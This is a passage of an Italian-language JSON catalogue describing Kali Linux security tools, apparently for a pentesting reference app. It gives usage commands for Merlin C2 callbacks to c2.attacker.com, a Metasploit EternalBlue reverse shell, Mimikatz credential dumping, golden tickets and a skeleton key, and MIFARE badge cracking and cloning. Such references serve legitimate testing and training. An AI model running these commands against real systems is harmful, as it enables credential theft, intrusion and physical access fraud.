blobs, e identificare tecniche di evasion usate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Privilegi Root:</strong> Richiede accesso root per leggere /dev/mem. Su kernel moderni (post-2.6.26), /dev/mem è spesso limitato al primo MB per motivi di sicurezza. Alternativa: usare LiME (Linux Memory Extractor) come kernel module.</p><p><strong>Kernel Restrictions:</strong> CONFIG_STRICT_DEVMEM e Secure Boot possono bloccare completamente l'accesso a /dev/mem. Su sistemi hardened, LiME o acquisizione hardware sono le uniche opzioni.</p><p><strong>Volatilità dei Dati:</strong> La memoria cambia continuamente. Processi che allocano/deallocano, garbage collection, e operazioni di sistema modificano il contenuto durante l'acquisizione. Minimizzare attività sul sistema durante il dump.</p><p><strong>Integrità Forense:</strong> L'esecuzione di memdump stesso modifica la memoria (caricamento binario, allocazioni). Per massima integrità forense, considerare acquisizione hardware (DMA via FireWire/Thunderbolt) o snapshot di VM.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Memory_Analysis"
    ],
    "notes": null
  },
  {
    "id": "merlin-agent",
    "name": "merlin-agent",
    "version": "2.4.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/merlin-agent/",
    "desc": "Agent cross-platform per C2 Merlin con comunicazione HTTP/2 e H2C.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Merlin Agent è il componente client del C2 framework Merlin. Scritto in Go per portabilità cross-platform (Windows, Linux, macOS). Comunica col server via HTTP/2 o H2C per traffico criptato e performante che si mimetizza come traffico web legittimo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cross-platform:</strong> Win/Linux/macOS.</p><p><strong>HTTP/2:</strong> Comunicazione moderna e veloce.</p><p><strong>Encrypted:</strong> TLS per sicurezza.</p><p><strong>Modular:</strong> Carica moduli a runtime.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera agent da server Merlin\nmerlin> use module/payload/create\nmerlin> set PAYLOAD windows/x64/merlin\nmerlin> run\n\n# Esegui agent su target\n./merlin-agent -url https://c2.attacker.com:443\n\n# Agent si connette e appare in Merlin\nmerlin> sessions\nmerlin> interact SESSION_ID</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, implant C2 su sistemi compromessi.</p><p>Nel <strong>Pentesting</strong>, post-exploitation cross-platform.</p><p><strong>Persistence</strong> con beacon regolari.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Binary Go identificabile. HTTP/2 traffic analysis. EDR può rilevare comportamento. Signature dell'agent note.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "merlin",
    "name": "merlin",
    "version": "2.1.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/merlin/",
    "desc": "C2 server cross-platform in Go con HTTP/2 per comunicazioni criptate e performanti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Merlin</strong> è un C2 (Command and Control) framework cross-platform scritto in Go. Usa HTTP/2 per comunicazioni criptate ad alte prestazioni. Include server, agent per Win/Linux/macOS, e moduli per post-exploitation. Alternativa moderna a framework legacy.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>HTTP/2:</strong> Multiplexing e performance.</p><p><strong>Cross-platform:</strong> Server e agent portabili.</p><p><strong>Modular:</strong> Moduli PowerShell, shellcode, etc.</p><p><strong>CLI Interface:</strong> Console interattiva.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia server\nmerlin\n\n# Configura listener\nmerlin> use listener/http2\nmerlin> set Port 443\nmerlin> start\n\n# Genera agent\nmerlin> use module/payload/create\nmerlin> set OS windows\nmerlin> run\n\n# Interagisci con agent\nmerlin> sessions\nmerlin> interact 1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, C2 infrastructure moderna.</p><p>Nel <strong>Pentesting</strong>, gestione di host compromessi.</p><p><strong>Training</strong> per operatori offensive security.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevabile:</strong> Pattern HTTP/2 identificabili. Certificate pinning consigliato. Traffic analysis può rivelare C2. Infra-red detection per pattern comunicazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "metagoofil",
    "name": "metagoofil",
    "version": "1.2.0",
    "icon": "../app/icons/metagoofil-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/metagoofil/",
    "desc": "Estrae metadati da documenti pubblici (PDF, DOC) per trovare username e software.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Metagoofil</strong> estrae metadati da documenti pubblici trovati via Google. Cerca PDF, DOC, XLS, PPT di un dominio target ed estrae username, path, software version, e altri metadati embedded. Informazioni utili per social engineering e attack surface mapping.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Google Search:</strong> Trova documenti del target.</p><p><strong>Multi-format:</strong> PDF, DOC, XLS, PPT, ODT.</p><p><strong>Metadata Extraction:</strong> Author, software, paths.</p><p><strong>Report:</strong> Output organizzato per tipo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca e analizza documenti\nmetagoofil -d target.com -t pdf,doc,xls -l 100 -o output/\n\n# Solo PDF\nmetagoofil -d target.com -t pdf -l 50 -o results/\n\n# Più risultati\nmetagoofil -d target.com -t pdf,doc -l 200 -n 50 -o out/\n\n# Output include:\n# - Username trovati\n# - Software versions\n# - Path interni</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, scopre info su target da documenti.</p><p>Nel <strong>Social Engineering</strong>, username per phishing.</p><p><strong>Attack Surface</strong> identifica software in uso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passivo:</strong> Usa Google, non contatta target direttamente. Google può rate limit. Richiede tempo per molti documenti.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "metasploit-framework-kali",
    "name": "metasploit-framework",
    "version": "6.4.84",
    "icon": "../app/icons/metasploit-framework-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/metasploit-framework/",
    "desc": "Il framework di exploitation più famoso con migliaia di exploit, payload e moduli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Metasploit Framework è IL framework di exploitation più utilizzato al mondo. Include migliaia di exploit, payload, encoder, post-exploitation module. Fornisce msfconsole per operazioni interattive, msfvenom per payload generation, e integrazione con database per gestire engagement complessi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Exploits:</strong> 2000+ exploit per ogni piattaforma.</p><p><strong>Payloads:</strong> Meterpreter, shell, VNC, etc.</p><p><strong>Post-exploitation:</strong> Privilege escalation, pivoting.</p><p><strong>Database:</strong> Tracking di host, servizi, vulnerabilità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia msfconsole\nmsfconsole\n\n# Cerca exploit\nmsf> search eternalblue\nmsf> use exploit/windows/smb/ms17_010_eternalblue\nmsf> set RHOSTS target.com\nmsf> set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf> set LHOST attacker.com\nmsf> exploit\n\n# Genera payload\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe > shell.exe</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Pentesting</strong>, exploitation di vulnerabilità.</p><p>Nel <strong>Red Team</strong>, post-exploitation completo.</p><p><strong>CTF</strong> per risolvere challenge.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Molto Rilevabile:</strong> Signature Metasploit note a tutti gli AV. Meterpreter detectato da EDR. Necessita evasion per ambienti protetti. Traffic pattern identificabili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "mfcuk",
    "name": "mfcuk",
    "version": "0.3.8",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mfcuk/",
    "desc": "Cracca chiavi MIFARE Classic usando attacco darkside per card cloning RFID.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MFCUK</strong> (MIFARE Classic Universal toolKit) è un tool specializzato per il cracking di chiavi su card MIFARE Classic 1K e 4K utilizzando l'attacco \"darkside\". Questo attacco sfrutta una debolezza fondamentale nel generatore di numeri pseudo-casuali (PRNG) del chip MIFARE, permettendo di recuperare chiavi di autenticazione senza conoscerne nessuna in partenza. MIFARE Classic è ampiamente utilizzata in badge di accesso aziendale, trasporto pubblico (biglietti contactless), e sistemi di pagamento. MFCUK è tipicamente il primo tool da usare quando si affronta una card completamente sconosciuta, per ottenere almeno una chiave che poi permette di utilizzare mfoc per l'attacco nested e recuperare tutte le altre.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Darkside Attack Implementation:</strong> Implementa l'attacco darkside scoperto nel 2008 da de Koning Gans. Sfrutta il PRNG debole del chip CRYPTO1 che usa solo 16 bit di entropia. Inviando comandi malformati e analizzando le risposte, deduce progressivamente i bit della chiave.</p><p><strong>Zero Knowledge Recovery:</strong> Non richiede alcuna chiave nota per iniziare. Questo lo distingue da mfoc che necessita almeno una chiave. MFCUK funziona su card dove tutte le chiavi sono state cambiate dai default.</p><p><strong>PRNG Weakness Exploitation:</strong> Il PRNG di MIFARE Classic si resetta prevedibilmente ad ogni power-up della card. MFCUK manipola timing e sequenza delle operazioni per sfruttare stati PRNG noti e ridurre lo spazio di ricerca delle chiavi.</p><p><strong>Foundation for Full Dump:</strong> Una volta ottenuta una singola chiave con MFCUK, il tool mfoc può usarla per eseguire l'attacco nested e recuperare rapidamente tutte le altre 31 chiavi (16 settori × 2 chiavi per settore su MIFARE 1K).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>MFCUK richiede un lettore NFC compatibile (tipicamente ACR122U o PN532).</p><pre><code># Attacco darkside base - recupera prima chiave\nmfcuk -C -R 0 -s 250 -S 250\n\n# -C: continua automaticamente dopo recovery\n# -R 0: target sector 0 (spesso ha chiavi default)\n# -s/-S: sample size per stabilità\n\n# Attacco con verbose output per debug\nmfcuk -C -R 0 -s 250 -S 250 -v 2\n\n# Specificare settore target diverso\nmfcuk -C -R 8 -s 250 -S 250\n\n# Output tipico:\n# Trying sector 0, keytype A\n# Found Key: FFFFFFFFFFFF\n# o\n# Found Key: A0B1C2D3E4F5\n\n# Workflow completo dopo MFCUK:\n# 1. Ottieni prima chiave con mfcuk\nmfcuk -C -R 0 -s 250 -S 250\n\n# 2. Usa la chiave trovata con mfoc per dump completo\nmfoc -O card_dump.mfd\n# mfoc usa automaticamente la chiave trovata\n\n# 3. Scrivi dump su card clone\nnfc-mfclassic w a blank_card.mfd card_dump.mfd</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Physical Security Assessment</strong>, MFCUK testa la sicurezza dei badge di accesso aziendali. Se le chiavi possono essere recuperate, l'intero sistema di controllo accessi basato su MIFARE Classic è compromesso.</p><p>Nel <strong>Physical Penetration Testing</strong>, dopo aver ottenuto brevemente accesso fisico a un badge (anche per pochi secondi), MFCUK può avviare il recovery delle chiavi permettendo la successiva clonazione completa.</p><p>Per <strong>Security Research</strong>, MFCUK è lo strumento standard per dimostrare la debolezza intrinseca di MIFARE Classic. Usato in paper accademici e presentazioni per illustrare perché questa tecnologia non dovrebbe essere usata per applicazioni sensibili.</p><p>Nel <strong>Lost Key Recovery</strong>, per sistemi legittimamente posseduti dove le chiavi sono state perse, MFCUK permette di recuperare l'accesso ai dati stored sulla card.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Accesso Fisico Richiesto:</strong> La card deve essere posizionata sul lettore NFC durante l'attacco. Il processo richiede da pochi secondi a diversi minuti. In scenari real-world, questo può richiedere social engineering per ottenere il badge temporaneamente.</p><p><strong>Hardware Specifico:</strong> Richiede lettore NFC compatibile con libnfc. ACR122U è il più comune e testato. Lettori integrati in laptop spesso non funzionano. PN532 boards sono alternativa economica.</p><p><strong>Legalità:</strong> Clonare badge di accesso senza autorizzazione è illegale nella maggior parte delle giurisdizioni. Può costituire reato di violazione di domicilio, frode informatica, o accesso abusivo a sistemi. Utilizzare solo in contesti autorizzati di security testing.</p><p><strong>Detection:</strong> L'attacco stesso non lascia tracce sulla card o sui log del sistema di controllo accessi. Tuttavia, l'uso successivo di una card clonata può essere rilevato se il sistema confronta altri identificatori (timestamp, sequenza, etc.).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "RFID_NFC"
    ],
    "notes": null
  },
  {
    "id": "mfoc",
    "name": "mfoc",
    "version": "0.10.7",
    "icon": "../app/icons/mfoc-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mfoc/",
    "desc": "Cracca MIFARE Classic con attacco nested authentication per recuperare tutte le chiavi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MFOC</strong> (MIFARE Classic Offline Cracker) è il tool standard per recuperare tutte le chiavi di una card MIFARE Classic utilizzando l'attacco nested authentication. A differenza di mfcuk che recupera la prima chiave senza conoscerne nessuna, MFOC richiede almeno una chiave nota (tipicamente una delle chiavi default come FFFFFFFFFFFF, o quella ottenuta con mfcuk). L'attacco nested sfrutta una vulnerabilità nel protocollo di autenticazione MIFARE: durante l'autenticazione a un settore usando una chiave nota, la card genera nonce che leak informazioni sulle altre chiavi. MFOC automatizza questo processo recuperando rapidamente tutte le 32 chiavi (16 settori × 2 chiavi A/B) e producendo un dump completo della card pronto per analisi o clonazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Nested Authentication Attack:</strong> Implementa l'attacco nested che sfrutta la correlazione tra nonce durante autenticazioni successive. Una volta nota una chiave, può recuperare le altre in secondi invece delle ore richieste da attacchi brute force.</p><p><strong>Default Key Probing:</strong> Prima di lanciare l'attacco nested, MFOC testa automaticamente un database di chiavi default comuni (FFFFFFFFFFFF, A0A1A2A3A4A5, etc.). Spesso almeno un settore usa chiavi default, fornendo il punto di partenza necessario.</p><p><strong>Complete Card Dump:</strong> Produce un dump binario .mfd di 1KB (MIFARE Classic 1K) o 4KB (MIFARE Classic 4K) contenente tutti i dati della card. Formato compatibile con nfc-mfclassic per scrittura su card vergini.</p><p><strong>Key Recovery Logging:</strong> Durante l'attacco, visualizza il progresso mostrando quali chiavi sono state recuperate per ogni settore. Utile per diagnosi quando alcune chiavi resistono all'attacco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>MFOC richiede lettore NFC compatibile con libnfc (ACR122U, PN532).</p><pre><code># Dump card provando chiavi default + nested attack\nmfoc -O card_dump.mfd\n# Output: dump completo se almeno una chiave default funziona\n\n# Con chiave già nota (es. da mfcuk)\nmfoc -k A0B1C2D3E4F5 -O dump.mfd\n\n# Multiple chiavi note\nmfoc -k FFFFFFFFFFFF -k A0A1A2A3A4A5 -k 000000000000 -O dump.mfd\n\n# Aumenta probing attempts per chiavi difficili\nmfoc -P 500 -O dump.mfd\n# -P: numero di prove per nested attack\n\n# Verbose output per debug\nmfoc -v -O dump.mfd\n\n# Output tipico durante esecuzione:\n# Found Key: A0B1C2D3E4F5 [default]\n# Sector 0 - Key A: FFFFFFFFFFFF\n# Sector 0 - Key B: FFFFFFFFFFFF\n# Sector 1 - Nested attack in progress...\n# Sector 1 - Key A: A1B2C3D4E5F6\n# ...\n# All keys recovered. Writing dump...\n\n# Workflow completo di clonazione:\n# 1. Recupera chiavi con mfoc\nmfoc -O original.mfd\n\n# 2. Scrivi dump su card vergine\nnfc-mfclassic w a blank.mfd original.mfd\n\n# 3. Verifica clone\nmfoc -O verify.mfd\ndiff original.mfd verify.mfd</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Physical Security Assessment</strong>, MFOC è il tool principale per testare la sicurezza di sistemi di controllo accessi basati su MIFARE Classic. Se le chiavi possono essere recuperate, l'intero sistema è compromesso e badge possono essere clonati.</p><p>Nel <strong>Penetration Testing Fisico</strong>, dopo aver ottenuto brevemente un badge target, MFOC permette di creare un clone funzionante che garantisce accesso persistente all'edificio senza dover sottrarre il badge originale.</p><p>Per <strong>Data Recovery</strong>, quando si hanno card MIFARE con dati importanti ma chiavi perse, MFOC può recuperare le chiavi permettendo di leggere i dati. Utile per legacy systems dove la documentazione è andata perduta.</p><p>Nella <strong>Security Research</strong>, MFOC è strumento fondamentale per studiare implementazioni MIFARE e dimostrare le debolezze intrinseche di questa tecnologia ancora ampiamente utilizzata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Accesso Fisico:</strong> La card deve essere posizionata sul lettore NFC durante l'intero processo di recovery (da pochi secondi a qualche minuto). In scenari reali, richiede accesso temporaneo al badge del target.</p><p><strong>Hardware Requirement:</strong> Necessita lettore NFC compatibile con libnfc. ACR122U è il più testato. Lettori NFC integrati nei laptop spesso non funzionano. PN532 è alternativa economica.</p><p><strong>Legalità:</strong> La clonazione di badge di accesso senza autorizzazione è reato in quasi tutte le giurisdizioni. Può configurare violazione di domicilio, frode informatica, o accesso abusivo. Utilizzare esclusivamente in contesti autorizzati di security assessment.</p><p><strong>Countermeasures:</strong> Alcune card MIFARE Classic hanno hardcoded sector 0 non leggibile. Card EV1 e successive hanno mitigazioni parziali. Per card completamente resistenti, considerare hardware attacks (power analysis) o upgrade a MIFARE DESFire.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "RFID_NFC"
    ],
    "notes": null
  },
  {
    "id": "mfterm",
    "name": "mfterm",
    "version": "1.0.7",
    "icon": "../app/icons/mfterm-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mfterm/",
    "desc": "Terminale interattivo per manipolazione card MIFARE: read, write, clone, format.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MFTerm</strong> è un terminale interattivo specializzato nella manipolazione di card MIFARE Classic 1K e 4K. A differenza di mfoc e mfcuk che sono orientati al key recovery, MFTerm fornisce un ambiente shell completo per operazioni di lettura, scrittura, modifica e clonazione una volta che le chiavi sono note. L'interfaccia a riga di comando interattiva permette di navigare tra settori, ispezionare dati in formato esadecimale e ASCII, modificare byte specifici, gestire le chiavi A e B di ogni settore, e salvare/caricare dump. È lo strumento ideale per chi deve analizzare il contenuto di card MIFARE, modificare dati specifici, o preparare card clone con contenuto personalizzato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Interactive Shell:</strong> Ambiente command-line con prompt dedicato per operazioni sequenziali su card. Supporta history dei comandi, auto-completion, e scripting per automazione di operazioni ripetitive.</p><p><strong>Sector-Level Access:</strong> Lettura e scrittura granulare a livello di singolo settore o blocco. Permette di modificare byte specifici senza toccare il resto della card, essenziale per manipolazioni chirurgiche.</p><p><strong>Key Management:</strong> Gestione separata delle chiavi A e B per ogni settore. Può caricare chiavi da file .mfd (dump mfoc), specificarle manualmente, o usare chiavi default. Visualizza quali chiavi sono note per quali settori.</p><p><strong>Hex/ASCII Editor:</strong> Visualizzazione simultanea esadecimale e ASCII del contenuto. Editor inline per modificare byte direttamente. Particolarmente utile per analizzare strutture dati e protocolli proprietari su card.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>MFTerm opera in modalità interattiva con comandi specifici per ogni operazione.</p><pre><code># Avvia il terminale interattivo\nmfterm\n\n# === GESTIONE CHIAVI ===\nmfterm> keys load dump.mfd      # Carica chiavi da file dump mfoc\nmfterm> keys set 0 a FFFFFFFFFFFF  # Imposta chiave A settore 0\nmfterm> keys set 0 b A0B1C2D3E4F5  # Imposta chiave B settore 0\nmfterm> keys print              # Mostra tutte le chiavi caricate\n\n# === LETTURA CARD ===\nmfterm> read a                  # Leggi tutti i settori con chiave A\nmfterm> read b                  # Leggi con chiave B\nmfterm> read a 3                # Leggi solo settore 3 con chiave A\n\n# === VISUALIZZAZIONE ===\nmfterm> print                   # Mostra tutto il contenuto (hex + ASCII)\nmfterm> print 1                 # Mostra solo settore 1\nmfterm> print 1 2               # Mostra settori 1 e 2\n\n# === MODIFICA DATI ===\nmfterm> edit 1                  # Entra in modalità edit settore 1\n# Nell'editor: modifica byte, ESC per uscire\nmfterm> set 1 0 DEADBEEF        # Imposta bytes nel blocco 0 del settore 1\n\n# === SCRITTURA ===\nmfterm> write a                 # Scrivi tutti i settori con chiave A\nmfterm> write a 1               # Scrivi solo settore 1\n\n# === SALVATAGGIO/CARICAMENTO ===\nmfterm> save backup.mfd         # Salva dump corrente\nmfterm> load card.mfd           # Carica dump da file\n\n# === CLONAZIONE WORKFLOW ===\n# 1. Leggi card originale\nmfterm> keys load original_keys.mfd\nmfterm> read a\nmfterm> save original.mfd\n\n# 2. Inserisci card vergine\nmfterm> write a\n\n# === UTILITY ===\nmfterm> clear                   # Azzera buffer in memoria\nmfterm> help                    # Lista comandi disponibili\nmfterm> quit                    # Esci</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Card Content Analysis</strong>, MFTerm permette di ispezionare in dettaglio la struttura dei dati memorizzati su card MIFARE. L'output hex+ASCII facilita il reverse engineering di protocolli proprietari usati da sistemi di accesso, pagamento, o ticketing.</p><p>Nel <strong>Data Modification</strong>, quando si deve modificare specifici byte su una card (es. saldo su card prepagata, livello accesso su badge), MFTerm offre l'editing chirurgico necessario senza dover riscrivere l'intera card.</p><p>Per <strong>Badge Cloning Personalizzato</strong>, permette di creare cloni con modifiche specifiche: stesso UID ma dati differenti, o viceversa. Utile per testing di sistemi che verificano sia ID che contenuto.</p><p>Durante <strong>Security Research</strong>, l'ambiente interattivo facilita l'esplorazione e sperimentazione su card MIFARE per comprendere implementazioni specifiche e identificare vulnerabilità.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Accesso Fisico:</strong> La card deve essere sul lettore durante tutte le operazioni. Per lettura basta contatto momentaneo, per scrittura la card deve rimanere stabile per tutta la durata dell'operazione.</p><p><strong>Write Risk:</strong> La scrittura errata può rendere la card inutilizzabile (brick), specialmente se si corrompono i trailer dei settori che contengono le chiavi. SEMPRE fare backup prima di qualsiasi modifica.</p><p><strong>Sector Trailer:</strong> L'ultimo blocco di ogni settore contiene chiavi e access bits. Modifiche errate a questa area bloccano permanentemente il settore. MFTerm avvisa ma permette la scrittura.</p><p><strong>Legalità:</strong> La modifica di card di sistemi di pagamento o accesso senza autorizzazione costituisce reato. Utilizzare solo su card di proprietà o in contesti autorizzati di security testing.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "RFID_NFC"
    ],
    "notes": null
  },
  {
    "id": "mimikatz-kali",
    "name": "mimikatz",
    "version": "2.2.0",
    "icon": "../app/icons/mimikatz-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mimikatz/",
    "desc": "Tool Windows per estrarre password, hash, ticket Kerberos e credenziali dalla memoria.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Mimikatz</strong> è IL tool per credential extraction su Windows. Estrae password in chiaro, hash NTLM, ticket Kerberos dalla memoria LSASS. Include funzioni per Pass-the-Hash, Pass-the-Ticket, Golden/Silver Ticket, DCSync e molte altre tecniche AD. Creato da gentilkiwi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>sekurlsa:</strong> Dump credenziali da LSASS.</p><p><strong>kerberos:</strong> Manipolazione ticket Kerberos.</p><p><strong>lsadump:</strong> DCSync, SAM dump.</p><p><strong>dpapi:</strong> Decrypt protezioni Windows.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === CREDENTIAL DUMPING ===\n# Dump credenziali live (richiede SYSTEM o debug priv)\nmimikatz# privilege::debug\nmimikatz# sekurlsa::logonpasswords\n\n# Dump da minidump LSASS (stealth - analisi offline)\n# Prima: procdump.exe -ma lsass.exe lsass.dmp\nmimikatz# sekurlsa::minidump lsass.dmp\nmimikatz# sekurlsa::logonpasswords\n\n# Dump SAM e SECURITY (local accounts)\nmimikatz# lsadump::sam\nmimikatz# lsadump::secrets\nmimikatz# lsadump::cache  # Cached domain credentials\n\n# === PASS-THE-HASH / PASS-THE-TICKET ===\n# PTH: spawn cmd con hash NTLM\nmimikatz# sekurlsa::pth /user:admin /domain:corp.local /ntlm:a87f3a337d73085c45f9416be5787d86 /run:cmd.exe\n\n# PTT: inject ticket in sessione corrente\nmimikatz# kerberos::ptt ticket.kirbi\n\n# === GOLDEN TICKET (Domain Persistence) ===\n# Richiede hash krbtgt (da DCSync)\nmimikatz# kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:a87f3a337d73085c45f9416be5787d86 /id:500 /groups:512,513,518,519,520 /ptt\n\n# === SILVER TICKET (Service-specific) ===\n# Accesso CIFS senza toccare DC\nmimikatz# kerberos::golden /user:FakeUser /domain:corp.local /sid:S-1-5-21-... /target:fileserver.corp.local /service:cifs /rc4:SERVICE_NTLM_HASH /ptt\n\n# === DCSYNC (Dump domain credentials remotely) ===\nmimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt\nmimikatz# lsadump::dcsync /domain:corp.local /all /csv  # Dump tutti gli hash\n\n# === DPAPI (Decrypt saved credentials) ===\n# Trova masterkeys\nmimikatz# dpapi::masterkey /in:\"C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-...\\masterkey\" /rpc\n# Decrypt Chrome passwords, saved credentials, etc.\nmimikatz# dpapi::chrome /in:\"C:\\Users\\victim\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect\n\n# === SKELETON KEY (Domain Backdoor) ===\n# Inietta password master \"mimikatz\" su DC\nmimikatz# misc::skeleton\n# Ora qualsiasi user può autenticarsi con \"mimikatz\"\n\n# === ONE-LINER per automation ===\nmimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" > creds.txt\nmimikatz.exe \"lsadump::dcsync /domain:corp.local /user:Administrator\" \"exit\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD Exploitation</strong>, credential theft e lateral movement.</p><p>Nel <strong>Pentesting</strong>, privilege escalation Windows.</p><p><strong>Red Team</strong> per domain dominance.</p><p><strong>DPAPI</strong> per recupero password salvate in browser e applicazioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Molto Rilevabile:</strong> Signature nota a tutti gli AV/EDR. LSASS access genera Sysmon Event ID 10. DCSync genera Event ID 4662. Skeleton Key modifica LSASS in memoria. Per stealth: dump LSASS con metodi alternativi (comsvcs.dll, ProcDump) e analizza offline.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "miredo",
    "name": "miredo",
    "version": "1.2.6",
    "icon": "../app/icons/miredo-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/miredo/",
    "desc": "Client e server Teredo per tunneling IPv6 over UDP/IPv4 attraverso NAT.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Miredo</strong> è un'implementazione open-source completa del protocollo Teredo, definito in RFC 4380. Teredo è una tecnologia di transizione IPv6 che permette di incapsulare pacchetti IPv6 all'interno di datagrammi UDP/IPv4, consentendo la connettività IPv6 anche attraverso dispositivi NAT che normalmente bloccherebbero il traffico IPv6 nativo. Miredo include tre componenti: client (per ottenere connettività IPv6), relay (per connettere reti Teredo a IPv6 nativo), e server (per coordinare i client attraverso NAT).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Teredo Client (miredo):</strong> Il componente principale per gli utenti finali. Si connette a server Teredo pubblici, determina il tipo di NAT, ottiene un indirizzo IPv6 Teredo (2001:0::/32) e crea un'interfaccia tunnel virtuale per il traffico IPv6.</p><p><strong>NAT Traversal Automatico:</strong> Implementa tecniche di NAT traversal incluse hole punching UDP e STUN-like qualification per funzionare attraverso la maggior parte delle configurazioni NAT (cone NAT, restricted NAT, symmetric NAT con limitazioni).</p><p><strong>Teredo Relay (miredo-server):</strong> Permette di configurare un relay che connette client Teredo alla rete IPv6 nativa, utile per fornire connettività IPv6 a reti interne o per test di infrastruttura.</p><p><strong>Interfaccia Tunnel Virtuale:</strong> Crea un'interfaccia di rete 'teredo' che appare come una normale interfaccia IPv6 al sistema operativo, permettendo a tutte le applicazioni di usare IPv6 trasparentemente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il client miredo si avvia come demone e configura automaticamente l'interfaccia tunnel.</p><pre><code># Avvia client Teredo (richiede root)\nsudo miredo\n\n# Verifica interfaccia tunnel creata\nip addr show teredo\n# Output: inet6 2001:0:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx/32 scope global\n\n# Test connettività IPv6\nping6 ipv6.google.com\nping6 2607:f8b0:4004:800::200e\n\n# Configurazione con server specifico\nsudo miredo -c 